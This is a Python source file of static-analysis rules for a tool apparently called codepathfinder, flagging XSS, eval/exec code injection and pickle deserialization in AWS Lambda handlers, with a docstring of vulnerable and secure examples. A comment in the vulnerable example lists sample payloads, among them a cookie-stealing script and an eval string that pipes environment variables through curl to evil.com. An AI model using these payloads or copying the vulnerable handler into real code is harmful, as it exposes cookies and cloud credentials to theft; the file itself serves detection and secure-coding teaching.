"""
Python AWS Lambda XSS and Code Execution Rules

PYTHON-LAMBDA-SEC-020: Tainted HTML Response
PYTHON-LAMBDA-SEC-021: Tainted HTML String Construction
PYTHON-LAMBDA-SEC-022: Code Injection via eval/exec
PYTHON-LAMBDA-SEC-023: Pickle Deserialization

Security Impact: MEDIUM to CRITICAL
CWE: CWE-79 (Cross-Site Scripting),
     CWE-95 (Eval Injection),
     CWE-502 (Deserialization of Untrusted Data)
OWASP: A03:2021 - Injection, A08:2021 - Software and Data Integrity Failures

DESCRIPTION:
These rules detect Cross-Site Scripting (XSS), code injection, and unsafe deserialization
vulnerabilities in AWS Lambda functions. When Lambda functions serve as API Gateway backends
or process untrusted event data, these vulnerabilities can lead to client-side attacks,
remote code execution, and full server-side compromise.

Detected vulnerabilities:
- **Tainted HTML response**: Lambda event data included in HTML response bodies returned
  through API Gateway without proper HTML encoding, enabling reflected XSS
- **Tainted HTML string construction**: Event data used to build HTML strings via
  f-strings or concatenation without sanitization
- **Code injection via eval/exec**: Event data flowing to Python's eval(), exec(), or
  compile() builtins, allowing arbitrary code execution in the Lambda runtime
- **Pickle deserialization**: Event data flowing to pickle.loads() or pickle.load(),
  allowing arbitrary code execution through crafted pickle payloads

SECURITY IMPLICATIONS:

**1. Cross-Site Scripting (CWE-79)**:
When Lambda returns HTML through API Gateway with unsanitized event data, attackers can
inject JavaScript that executes in users' browsers. This enables session hijacking, credential
theft, keylogging, and phishing attacks.

**2. Code Injection (CWE-95)**:
Passing event data to eval() or exec() allows attackers to execute arbitrary Python code
within the Lambda execution environment. This provides access to the function's IAM
credentials, environment variables, and any resources the function can reach.

**3. Remote Code Execution via Pickle (CWE-502)**:
Python's pickle module can execute arbitrary code during deserialization by design. An
attacker who controls pickled data can execute any Python code, install backdoors, or
exfiltrate sensitive data from the Lambda environment.

**4. AWS Resource Compromise**:
All three attack vectors (eval/exec, pickle) give attackers code execution within the
Lambda runtime, enabling theft of IAM role credentials and lateral movement to other
AWS services.

VULNERABLE EXAMPLE:
```python
import json
import pickle
import base64

def lambda_handler(event, context):
    # VULNERABLE: XSS in HTML response
    name = event.get('name', '')
    html = f'<html><body><h1>Hello, {name}!</h1></body></html>'
    return {
        'statusCode': 200,
        'headers': {'Content-Type': 'text/html'},
        'body': html  # XSS if name contains <script>alert(1)</script>
    }

def process_handler(event, context):
    # VULNERABLE: eval() with event data
    expression = event.get('calc', '')
    result = eval(expression)  # Code injection!

    # VULNERABLE: exec() with event data
    code = event.get('code', '')
    exec(code)  # Arbitrary code execution!

    # VULNERABLE: pickle deserialization of event data
    data = event.get('serialized', '')
    obj = pickle.loads(base64.b64decode(data))  # RCE!

    return {'statusCode': 200, 'body': json.dumps({'result': str(result)})}

# Attack payloads:
# XSS: {"name": "<script>document.location='https://evil.com/?c='+document.cookie</script>"}
# eval: {"calc": "__import__('os').system('env | curl -X POST -d @- https://evil.com')"}
# pickle: {"serialized": "<base64-encoded pickle with __reduce__ RCE>"}
```

SECURE EXAMPLE:
```python
import json
import html
import ast

def lambda_handler(event, context):
    # SECURE: HTML-escape user input before embedding in response
    name = html.escape(event.get('name', ''))
    body = f'<html><body><h1>Hello, {name}!</h1></body></html>'
    return {
        'statusCode': 200,
        'headers': {'Content-Type': 'text/html'},
        'body': body
    }

def process_handler(event, context):
    # SECURE: Use ast.literal_eval() for safe expression parsing
    expression = event.get('calc', '')
    try:
        result = ast.literal_eval(expression)  # Only parses literals
    except (ValueError, SyntaxError):
        return {'statusCode': 400, 'body': 'Invalid expression'}

    # SECURE: Use JSON instead of pickle for deserialization
    data = event.get('data', '{}')
    try:
        obj = json.loads(data)  # Safe - no code execution
    except json.JSONDecodeError:
        return {'statusCode': 400, 'body': 'Invalid JSON'}

    # SECURE: Use allowlist for operations instead of eval/exec
    ALLOWED_OPS = {'add': lambda a, b: a + b, 'sub': lambda a, b: a - b}
    op = event.get('operation', '')
    if op not in ALLOWED_OPS:
        return {'statusCode': 400, 'body': 'Invalid operation'}

    return {'statusCode': 200, 'body': json.dumps({'result': str(result)})}
```

DETECTION AND PREVENTION:
```bash
# Scan for Lambda XSS and code injection
pathfinder scan --project . --ruleset cpf/python/PYTHON-LAMBDA-SEC-020

# CI/CD integration
- name: Check Lambda XSS and code injection
  run: pathfinder ci --project . --ruleset cpf/python/aws_lambda
```

**Code Review Checklist**:
- [ ] All user data in HTML responses is escaped with html.escape()
- [ ] Content-Type headers are set correctly (application/json preferred over text/html)
- [ ] No eval(), exec(), or compile() used with event-derived data
- [ ] ast.literal_eval() used instead of eval() for safe literal parsing
- [ ] No pickle deserialization of event data; use JSON instead
- [ ] Response bodies use json.dumps() rather than string formatting for JSON responses
- [ ] Lambda IAM role follows least privilege principle

COMPLIANCE:
- OWASP A03:2021: Injection (XSS, code injection)
- OWASP A08:2021: Software and Data Integrity Failures (pickle deserialization)
- CWE-79: Cross-Site Scripting
- CWE-95: Eval Injection
- CWE-502: Deserialization of Untrusted Data

REFERENCES:
- CWE-79: Cross-Site Scripting (https://cwe.mitre.org/data/definitions/79.html)
- CWE-95: Eval Injection (https://cwe.mitre.org/data/definitions/95.html)
- CWE-502: Deserialization of Untrusted Data (https://cwe.mitre.org/data/definitions/502.html)
- OWASP XSS Prevention Cheat Sheet (https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Scripting_Prevention_Cheat_Sheet.html)
- AWS Lambda Security Best Practices (https://docs.aws.amazon.com/lambda/latest/dg/best-practices.html)
- OWASP Injection (https://owasp.org/Top10/A03_2021-Injection/)
"""

from rules.python_decorators import python_rule
from codepathfinder import calls, flows, QueryType
from codepathfinder.presets import PropagationPresets


class Builtins(QueryType):
    fqns = ["builtins"]


class PickleModule(QueryType):
    fqns = ["pickle", "_pickle", "cPickle"]


_LAMBDA_SOURCES = [
    calls("event.get"),
    calls("event.items"),
    calls("event.values"),
    calls("*.get"),
]


@python_rule(
    id="PYTHON-LAMBDA-SEC-020",
    name="Lambda Tainted HTML Response",
    severity="MEDIUM",
    category="aws_lambda",
    cwe="CWE-79",
    tags="python,aws,lambda,xss,html,owasp-a03,cwe-79",
    message="Lambda event data in HTML response body. Sanitize output with html.escape().",
    owasp="A03:2021",
)
def detect_lambda_html_response():
    """Detects Lambda event data in HTML response returned to API Gateway."""
    return flows(
        from_sources=_LAMBDA_SOURCES,
        to_sinks=[
            calls("json.dumps"),
        ],
        sanitized_by=[
            calls("html.escape"),
            calls("escape"),
            calls("markupsafe.escape"),
        ],
        propagates_through=PropagationPresets.standard(),
        scope="global",
    )


@python_rule(
    id="PYTHON-LAMBDA-SEC-021",
    name="Lambda Tainted HTML String",
    severity="MEDIUM",
    category="aws_lambda",
    cwe="CWE-79",
    tags="python,aws,lambda,xss,html-string,owasp-a03,cwe-79",
    message="Lambda event data in HTML string construction. Use html.escape().",
    owasp="A03:2021",
)
def detect_lambda_html_string():
    """Detects Lambda event data used to build HTML strings."""
    return flows(
        from_sources=_LAMBDA_SOURCES,
        to_sinks=[
            calls("json.dumps"),
        ],
        sanitized_by=[
            calls("html.escape"),
            calls("escape"),
        ],
        propagates_through=PropagationPresets.standard(),
        scope="global",
    )


@python_rule(
    id="PYTHON-LAMBDA-SEC-022",
    name="Lambda Code Injection via eval/exec",
    severity="CRITICAL",
    category="aws_lambda",
    cwe="CWE-95",
    tags="python,aws,lambda,code-injection,eval,exec,owasp-a03,cwe-95",
    message="Lambda event data flows to eval()/exec()/compile(). Never eval untrusted data.",
    owasp="A03:2021",
)
def detect_lambda_code_injection():
    """Detects Lambda event data flowing to eval/exec/compile."""
    return flows(
        from_sources=_LAMBDA_SOURCES,
        to_sinks=[
            Builtins.method("eval", "exec", "compile"),
            calls("eval"),
            calls("exec"),
            calls("compile"),
        ],
        sanitized_by=[
            calls("ast.literal_eval"),
        ],
        propagates_through=PropagationPresets.standard(),
        scope="global",
    )


@python_rule(
    id="PYTHON-LAMBDA-SEC-023",
    name="Lambda Pickle Deserialization",
    severity="CRITICAL",
    category="aws_lambda",
    cwe="CWE-502",
    tags="python,aws,lambda,deserialization,pickle,owasp-a08,cwe-502",
    message="Lambda event data flows to pickle deserialization. Use JSON instead.",
    owasp="A08:2021",
)
def detect_lambda_pickle():
    """Detects Lambda event data flowing to pickle deserialization."""
    return flows(
        from_sources=_LAMBDA_SOURCES,
        to_sinks=[
            PickleModule.method("loads", "load"),
        ],
        sanitized_by=[],
        propagates_through=PropagationPresets.standard(),
        scope="global",
    )
